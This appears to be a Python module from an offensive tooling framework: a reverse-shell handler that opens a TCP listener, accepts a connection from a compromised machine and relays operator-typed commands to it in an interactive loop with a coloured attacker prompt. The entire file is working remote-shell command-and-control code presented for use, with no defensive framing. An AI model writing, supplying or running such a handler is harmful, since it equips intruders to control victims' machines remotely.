# Handle module for bind / reverse shell
import socket


def prompt(ip, port, module, class_name):
    prompt_value = "\033[91m┌[\033[96m" + ip + "\033[91m:\033[93m" + port + "\033[91m]─[\033[92m"
    prompt_value += module + "\033[91m]─[\033[97m" + class_name + "\033[91m]" + "\n└→ \033[00m"
    return prompt_value


def reverse_con(ip, port, module, class_name):
    """
    Create Reverse Shell handler
    # TODO support IPv6
    :return:
    """

    svr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Fix address in use https://stackoverflow.com/questions/6380057/python-binding-socket-address-already-in-use
    svr.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        svr.bind((ip, int(port)))
        svr.listen(1)  # TODO listen more?
        print("Waiting for connection at {}:{}".format(ip, port))
    except Exception as error:
        print("[x] Error while create listener")
        print(error)
        return

    client, client_addr = svr.accept()
    print("Connected from", client_addr)

    while True:
        try:
            cmd = input(prompt(ip, port, module, class_name)) + "\n"
            if cmd != "":
                if cmd == "exit\n" or cmd == "quit\n":
                    client.sendall("exit".encode())
                    return
                else:
                    client.sendall(cmd.encode())
                    print(client.recv(1024).decode())
            else:
                prompt(ip, port, module, class_name)
        except KeyboardInterrupt:
            choice = input("Do you want to quit? [Y] ")
            if choice in ("yes", "Yes", "y", "Y"):
                client.sendall("exit".encode())
                return
        except Exception as error:
            print("[x] Runtime error")
            print(error)
            return
        finally:
            svr.close()
